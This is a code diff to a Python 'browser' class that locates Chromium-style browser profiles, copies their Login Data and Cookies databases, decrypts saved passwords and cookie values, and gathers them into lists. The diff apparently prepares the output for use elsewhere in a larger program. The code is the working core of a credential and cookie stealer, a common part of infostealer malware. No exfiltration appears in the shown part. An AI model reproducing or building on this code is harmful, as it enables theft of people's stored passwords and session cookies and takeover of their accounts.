@@ -52,10 +52,10 @@ class browser:
             return None
     
     def GetPasswords(self):
-        passwords = ""
+        passwords = []
         for browser_name,browser_path,secret_key in self.browsers:
             try:
-                passwords += "-"*50 + "\nBROWSER:%s\n"%browser_name + "-"*50
+                # passwords += "-"*50 + "\nBROWSER:%s\n"%browser_name + "-"*50
                 folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                 for folder in folders:
                     chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(browser_path,folder))
@@ -70,8 +70,7 @@ class browser:
                             ciphertext = login[2]
                             if(username!="" and ciphertext!=""):
                                 decrypted_password = self.__decrypt_data(secret_key,ciphertext[3:15],ciphertext[15:-16])
-                                print(decrypted_password)
-                                passwords = passwords + "\nURL:%s \nUSERNAME:%s \nPASSWORD:%s\n"%(url, username, decrypted_password)+ "-"*50
+                                passwords.append([browser_name,url, username, decrypted_password])
                         cursor.close()
                         conn.close()
                         os.remove("Loginvault.db")
@@ -92,11 +91,10 @@ class browser:
             return ""
     
     def GetCookies(self):
-        cookies = ""
+        cookies = []
         for browser_name,browser_path,secret_key in self.browsers:
             
             try:
-                cookies += "-"*50 + "\nBROWSER:%s\n"%browser_name + "-"*50
                 folders = [element for element in os.listdir(browser_path) if re.search("^Profile*|^Default$",element)!=None]
                 for folder in folders:
                     print(r"%s\%s\Network\Cookies"%(browser_path,folder))
@@ -113,15 +111,10 @@ class browser:
                             creation_utc = self.__get_chrome_datetime(creation_utc)
                             last_access_utc = self.__get_chrome_datetime(last_access_utc)
                             expires_utc = self.__get_chrome_datetime(expires_utc)
-                            cookies = cookies + "\nHOST:%s \nNAME:%s \nVALUE:%s \nCREATED:%s \nLAST ACCESS:%s \nEXPIRES:%s \n"%(host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc)+ "-"*50
+                            cookies.append([browser_name,host_key, name, decrypted_value, creation_utc, last_access_utc, expires_utc])
                         cursor.close()
                         conn.close()
                         os.remove("Cookies.db")
-                    else:
-                        cookies+= f"[-][ERR] Unable to get database connection for {browser_name} Browser"
             except Exception as e:
                 return "[-][ERR] %s"%str(e)
         return cookies
-
-print(browser().GetCookies())
-print(browser().GetPasswords())
